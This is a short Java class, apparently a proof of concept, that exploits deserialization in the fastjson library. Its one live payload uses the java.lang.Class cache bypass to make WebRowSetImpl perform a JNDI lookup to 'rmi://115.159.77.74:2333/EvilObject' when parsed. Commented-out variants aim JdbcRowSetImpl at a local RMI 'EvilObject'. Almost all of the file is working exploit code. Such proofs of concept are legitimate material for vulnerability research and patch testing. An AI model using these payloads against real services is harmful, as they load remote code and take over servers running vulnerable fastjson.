package fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @author huanmao.sjc
 * @version $Id: fastjson.FastJsonTest, v 0.1 2020-01-02 11:46 AM th1s Exp $
 */
public class FastJsonTest {

    public static void main(String[] args) {
        //序列化
//        User user = new User();
//        user.setId((long) 1);
//        user.setName("huanmao");
//        String jsonString = JSON.toJSONString(user);
//        System.out.println(jsonString);


        //反序列化
//        String jsonString0 = "{\"@type\":\"fastjson.User\", \"names\":{}}";
//        JSON.parse(jsonString0);

//        反序列化
//        String jsonString1 = "{\"@type\":\"java.lang.String\",\"val\":\"com.sun.rowset.\"}";
//        JSON.parse(jsonString1);


        // 利用缓存1
        String jsonString2 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.WebRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.WebRowSetImpl\",\"dataSourceName\":\"rmi://115.159.77.74:2333/EvilObject\",\"autoCommit\":true}},age:11}";
        JSON.parseObject(jsonString2);

//
//
//        //利用缓存2
//        try {
//            String jsonString3 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost/EvilObject\",\"autoCommit\":true}";
//            //        User user2 = (User) JSON.parse(jsonString2);
//            JSON.parse(jsonString3);
//        } catch (Exception e) {
//            JSON.parse("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost/EvilObject\",\"autoCommit\":true}");
//        }
//        System.out.println(user2.getName());
    }
}
